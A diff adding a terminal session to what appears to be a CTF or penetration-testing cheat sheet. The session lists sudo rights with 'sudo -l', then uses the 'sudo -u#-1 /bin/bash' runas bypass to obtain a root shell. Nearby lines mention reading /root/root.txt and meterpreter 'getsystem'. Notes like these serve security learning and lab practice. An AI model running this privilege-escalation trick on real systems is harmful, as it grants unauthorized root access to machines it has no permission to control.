@@ -690,6 +690,30 @@ cat: /root/root.txt: Permission denied  - Does not work
 > $ sudo cat /root/root.txt  - Work
 ```
 
+```
+user@host:~$ sudo -l
+sudo -l
+Matching Defaults entries for user on host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on host:
+    (ALL, !root) /bin/bash
+
+user@host:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+Password: Password
+
+Sorry, try again.
+Password: <Enter Password>
+
+root@host:/home/user# id
+id
+uid=0(root) gid=1001(user) groups=1001(user)
+
+```
+
+
 #### Gain More Privilige on windows system
 - In meterpreter shell try `getsystem`
 - In meterpreter shell try `background` and then follow rest of commands.
